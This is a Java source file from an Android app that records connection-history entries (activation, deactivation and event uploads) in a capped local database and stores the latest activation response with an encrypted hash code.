package com.fx.preference;

import java.util.ArrayList;
import java.util.List;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.fx.activation.ActivationManager.Status;
import com.fx.activation.Response;
import com.fx.maind.ref.Customization;
import com.fx.preference.model.ConnectionHistory;
import com.fx.preference.model.ConnectionHistory.ConnectionStatus;
import com.fx.preference.model.ConnectionHistory.ConnectionType;
import com.fx.util.FxSettings;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;

class ConnectionHistoryManagerImpl implements ConnectionHistoryManager {
	
	private static final String TAG = "ConnectionHistoryManager";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static ConnectionHistoryManagerImpl sInstance;
	
	private Context mContext;
	private PreferenceDatabaseHelper mPreferencedbHelper;
	
	private ConnectionHistoryManagerImpl(Context context) {
		mContext = context;
		mPreferencedbHelper = PreferenceDatabaseHelper.getInstance();
	}
	
	public static ConnectionHistoryManagerImpl getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new ConnectionHistoryManagerImpl(context);
		}
		return sInstance;
	}
	
//-------------------------------------------------------------------------------------------------	
// CONNECTION HISTORY METHODS
//-------------------------------------------------------------------------------------------------
	
	/**
	 * Adds the given ConnectionHistory instance to the ring buffer. 
	 */
	public void addConnectionHistory(ConnectionHistory history) {
		if (LOGV) FxLog.v(TAG, String.format("Add connection history: %s", history.toString()));
		
		Uri uri = Uri.parse(PreferenceDatabaseMetadata.ConnectionHistory.URI);
		
		ContentValues values = new ContentValues();
		
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.ACTION, 
				history.getAction().toString());
		
		ConnectionType connType = history.getConnectionType();
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_TYPE, 
				connType == null ? ConnectionType.UNRECOGNIZED.toString() : connType.toString());
		
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_START_TIME, 
				history.getConnectionStartTime());
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_END_TIME, 
				history.getConnectionEndTime());
		
		ConnectionStatus connStatus = history.getConnectionStatus();
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_STATUS, 
				connStatus == null ? ConnectionStatus.FAILED.toString() : connStatus.toString());
		
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.RESPONSE_CODE, 
				history.getResponseCode());
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.HTTP_STATUS_CODE, 
				history.getHttpStatusCode());
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.NUM_EVENTS_SENT, 
				history.getNumEventsSent());
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.NUM_EVENTS_PROCESSED, 
				history.getNumEventsProcessed());
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.TIMESTAMP, 
				history.getTimestamp());
		values.put(
				PreferenceDatabaseMetadata.ConnectionHistory.MESSAGE, 
				history.getMessage());
		
		mPreferencedbHelper.insert(uri, values);
		
		manageConnectionHistoryList();
		
		mContext.getContentResolver().notifyChange(URI_NEW_RECORD_ADDED, null);
	}
	
	/**
	 * Maintain the number of Connection History records
	 */
	private void manageConnectionHistoryList() {
		
		Cursor cursor = mPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.ConnectionHistory.URI), 
				null, null, null, null);
		
		// Check number of history
		int numberOfHistory = cursor.getCount();
		
		if (LOGV) {
			FxLog.v(TAG, String.format("Number of connection history: %d row(s)", numberOfHistory));
		}
		
		// Check last row ID
		int lastRowId = 0; 
		if (cursor.moveToLast()) {
			lastRowId = cursor.getInt(cursor.getColumnIndex(
					PreferenceDatabaseMetadata.ConnectionHistory.ROW_ID));
		}
		
		// Close a query cursor
		if (cursor != null) {
			cursor.close();
		}
		
		// These constraints must be met, to delete history records
		if (numberOfHistory > FxSettings.getMaxConnectionHistory() && lastRowId > 0) {
			Uri delete = Uri.parse(PreferenceDatabaseMetadata.ConnectionHistory.URI);
			
			StringBuilder selection = new StringBuilder();
			selection.append(PreferenceDatabaseMetadata.ConnectionHistory.ROW_ID);
			selection.append("<=").append(lastRowId - FxSettings.getMaxConnectionHistory());
			
			int rowAffected = mPreferencedbHelper.delete(delete, selection.toString(), null);
			
			if (LOGV) {
				FxLog.v(TAG, String.format("Deleted connection history: %d row(s)", rowAffected));
			}
		}
	}
	
	/**
	 * Returns a snapshot of the current <code>ConnectionHistory</code> ring buffer. The returned 
	 * list will be ordered by row_id from the newest item to the previous 4 items. 
	 */
	public List<ConnectionHistory> getConnectionHistoryList() {
		
		Cursor cursor = mPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.ConnectionHistory.URI), 
				null, null, null, 
				PreferenceDatabaseMetadata.ConnectionHistory.DESC_SORT);
		
		ArrayList<ConnectionHistory> historyList = new ArrayList<ConnectionHistory>();
		
		// Get top 5 history
		for (int i = 0; i < FxSettings.getMaxConnectionHistory(); i++) {
			if (!cursor.moveToNext()) {
				break;
			}
			historyList.add(createConnectionHistory(cursor));
		}
		
		if (cursor != null) {
			cursor.close();
		}

		return historyList;
	}
	
	public ConnectionHistory getLatestConnectionHistory() {
		Cursor cursor = mPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.ConnectionHistory.URI), 
				null, null, null, null);
		
		ConnectionHistory history = null;
		
		if (cursor.moveToLast()) {
			history = createConnectionHistory(cursor);
		}
		
		cursor.close();
		
		return history;
	}
	
	/**
	 * Create object of ConnectionHistory from Cursor object
	 */
	private ConnectionHistory createConnectionHistory(Cursor cursor) {
		
		// Get time stamp
		long timestamp = cursor.getLong(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.TIMESTAMP));
		
		String message = cursor.getString(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.MESSAGE));
		
		// Get action
		String actionString = cursor.getString(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.ACTION));
		
		ConnectionHistory.Action action = null;
		if (actionString.equals(ConnectionHistory.Action.ACTIVATE.toString())) {
			action = ConnectionHistory.Action.ACTIVATE;
		}
		else if (actionString.equals(ConnectionHistory.Action.DEACTIVATE.toString())) {
			action = ConnectionHistory.Action.DEACTIVATE;
		}
		else if (actionString.equals(ConnectionHistory.Action.UPLOAD_EVENTS.toString())) {
			action = ConnectionHistory.Action.UPLOAD_EVENTS;
		}
		
		// Get connection type
		String typeString = cursor.getString(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_TYPE));
		ConnectionHistory.ConnectionType type = null;
		if (typeString.equals(ConnectionHistory.ConnectionType.MOBILE.toString())) {
			type = ConnectionHistory.ConnectionType.MOBILE;
		}
		else if (typeString.equals(ConnectionHistory.ConnectionType.WIFI.toString())) {
			type = ConnectionHistory.ConnectionType.WIFI;
		}
		else if (typeString.equals(ConnectionHistory.ConnectionType.NO_CONNECTION.toString())) {
			type = ConnectionHistory.ConnectionType.NO_CONNECTION;
		}
		else if (typeString.equals(ConnectionHistory.ConnectionType.UNRECOGNIZED.toString())) {
			type = ConnectionHistory.ConnectionType.UNRECOGNIZED;
		}
		
		// Get connection start time
		long startTime = cursor.getLong(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_START_TIME));
		
		// Get connection end time
		long endTime = cursor.getLong(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_END_TIME));
		
		// Get connection status
		String statusString = cursor.getString(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_STATUS));
		ConnectionHistory.ConnectionStatus status = null;
		if (statusString.equals(ConnectionHistory.ConnectionStatus.SUCCESS.toString())) {
			status = ConnectionHistory.ConnectionStatus.SUCCESS;
		}
		if (statusString.equals(ConnectionHistory.ConnectionStatus.FAILED.toString())) {
			status = ConnectionHistory.ConnectionStatus.FAILED;
		}
		if (statusString.equals(ConnectionHistory.ConnectionStatus.TIMEOUT.toString())) {
			status = ConnectionHistory.ConnectionStatus.TIMEOUT;
		}
		
		// Get response code
		byte responseCode = (byte) cursor.getInt(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.RESPONSE_CODE));
		
		// Get HTTP status code
		int httpStatusCode = cursor.getInt(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.HTTP_STATUS_CODE));
		
		// Get number of sent events
		int numEventsSent = cursor.getInt(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.NUM_EVENTS_SENT));
		
		// Get number of processed events
		int numEventsProcessed = cursor.getInt(cursor.getColumnIndex(
				PreferenceDatabaseMetadata.ConnectionHistory.NUM_EVENTS_PROCESSED));
		
		ConnectionHistory history = new ConnectionHistory(timestamp);
		history.setAction(action);
		history.setConnectionType(type);
		history.setConnectionStartTime(startTime);
		history.setConnectionEndTime(endTime);
		history.setConnectionStatus(status);
		history.setResponseCode(responseCode);
		history.setHttpStatusCode(httpStatusCode);
		history.setNumEventsSent(numEventsSent);
		history.setNumEventsProcessed(numEventsProcessed);
		history.setMessage(message);
		
		return history;
	}
	
//-------------------------------------------------------------------------------------------------
// ACTIVATION RESPONSE METHODS
//-------------------------------------------------------------------------------------------------

	public void setActivationResponse(Response response) {
		if (response != null) {
			
			Integer isActivateAction = response.isActivateAction() ? 1 : 0;
			Integer isSuccess = response.isSuccess() ? 1 : 0;
			
			String activationStatus = PreferenceDatabaseMetadata.ActivationResponse.STATUS_ACTIVATED;
			if (response.getActivationStatus() == Status.DEACTIVATED) {
				activationStatus = PreferenceDatabaseMetadata.ActivationResponse.STATUS_DEACTIVATED;
			}
			
			String hashCode = "";
			if (response.isSuccess()) {
				hashCode = response.getHashCode();
				if (hashCode != null) {
					hashCode = FxUtil.getEncryptedInsertData(hashCode, true);
				}
			}
    		
    		// Construct ContentValue object
    		ContentValues values = new ContentValues();
    		values.put(PreferenceDatabaseMetadata.ActivationResponse.IS_ACTIVATE_ACTION, isActivateAction);
    		values.put(PreferenceDatabaseMetadata.ActivationResponse.IS_SUCCESS, isSuccess);
    		values.put(PreferenceDatabaseMetadata.ActivationResponse.MESSAGE, response.getMessage());
    		values.put(PreferenceDatabaseMetadata.ActivationResponse.ACTIVATION_STATUS, activationStatus);
    		values.put(PreferenceDatabaseMetadata.ActivationResponse.HASH_CODE, hashCode);
    		
    		// Remove existing response information
    		mPreferencedbHelper.delete(
    				Uri.parse(PreferenceDatabaseMetadata.ActivationResponse.URI), null, null);
    		
			// Insert new response info
			mPreferencedbHelper.insert(
					Uri.parse(PreferenceDatabaseMetadata.ActivationResponse.URI), values);
    			
			if (LOGV) {
    			FxLog.v(TAG, String.format("Response information is updated"));
    		}
    	}
	}

	public Response getActivationResponse() {
    	
		Cursor cursor = mPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.ActivationResponse.URI), null, null, null, null);
		
    	Response response = null;
    	
    	if (cursor.moveToNext()) {
    		boolean isActivateAction = cursor.getInt(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ActivationResponse.IS_ACTIVATE_ACTION)) > 0 ? true : false;
    		
    		boolean isSuccess = cursor.getInt(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ActivationResponse.IS_SUCCESS)) > 0 ? true : false;
    		
    		String message = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ActivationResponse.MESSAGE));
    		
    		String activationStatusStr = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ActivationResponse.ACTIVATION_STATUS));
    		
    		Status activationStatus = Status.ACTIVATED;
    		if (activationStatusStr.equals(PreferenceDatabaseMetadata.ActivationResponse.STATUS_DEACTIVATED)) { 
    			activationStatus = Status.DEACTIVATED;
    		}
    		
    		String hashCode = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ActivationResponse.HASH_CODE));
    		hashCode = FxUtil.getDecryptedQueryData(hashCode, true);
    		
    		response = new Response();
    		response.setActivateAction(isActivateAction);
    		response.setSuccess(isSuccess);
    		response.setMessage(message);
    		response.setActivationStatus(activationStatus);
    		response.setHashCode(hashCode);
    	}
    	
    	if (cursor != null) {
    		cursor.close();
    	}
    	
    	return response;
    }

}
